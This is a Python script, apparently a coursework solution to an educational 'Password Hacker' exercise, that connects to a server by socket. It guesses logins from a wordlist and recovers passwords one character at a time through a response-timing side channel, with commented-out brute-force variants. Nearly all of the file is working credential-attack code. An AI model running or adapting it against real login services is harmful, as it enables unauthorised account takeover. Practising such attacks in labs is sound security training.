import itertools
import json
import socket
import sys
from string import ascii_lowercase, ascii_letters, digits
from datetime import datetime


class PasswordHacker:
    def __init__(self):
        self.chars = ascii_letters + digits
        self.passwords_path = r"C:\Users\lukya\PycharmProjects\Password Hacker\Password Hacker\task\passwords.txt"
        self.logins_path = r"C:\Users\lukya\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt"
        self.login = None
        self.password = ''


    def hack_json(self, socket):
        # Hacking login
        with open(self.logins_path, encoding="utf-8") as logins_file:
            for login in logins_file:
                d = {
                    "login": login.strip(),
                    "password": " "
                }
                json_str = json.dumps(d)
                socket.send(json_str.encode())
                res = socket.recv(1024).decode()
                dic = json.loads(res)
                if dic["result"] == "Wrong password!":
                    self.login = login.strip()
                    break

        # Hacking password
        while True:
            for pwd_str in self.chars:
                d = {
                    "login": self.login,
                    "password": self.password + pwd_str
                }
                json_str = json.dumps(d)
                start = datetime.now()
                socket.send(json_str.encode())
                res = socket.recv(1024).decode()
                diff = datetime.now() - start
                dic = json.loads(res)
                if dic["result"] == "Connection success!":
                    self.password = self.password + pwd_str
                    return
                elif dic["result"] == "Wrong password!":
                    if diff.microseconds >= 90000:
                        self.password += pwd_str
                        break
                    else:
                        continue
                else:
                    continue

    def print_credentials(self):
        d = {
                "login": self.login,
                "password": self.password
        }
        json_str = json.dumps(d, indent=4)
        print(json_str)

    def start(self):
        ip, port = sys.argv[1:]
        with socket.socket() as client:
            client.connect((ip, int(port)))
            self.hack_json(client)

        if self.login and self.password:
            self.print_credentials()

        """
        Code for the early stage implementations of the project
        using itertools.product()

        """
        # with socket.socket() as client, open(passwords_path, encoding='utf-8') as passwords:
        #     client.connect((ip, int(port)))
            # for i in range(1, len(chars) + 1):
            #     iter = itertools.product(chars, repeat=i)
            #     for pwd in iter:
            # for password in passwords:
            #     l = map(lambda x: ''.join(x),
            #             itertools.product(*([let.lower(), let.upper()] for let in password.strip())))
            #     for pwd in l:
            #         client.send(pwd.encode())
            #         res = client.recv(1024).decode()
            #         if res == "Connection success!":
            #             print(pwd)
            #             return


PasswordHacker().start()

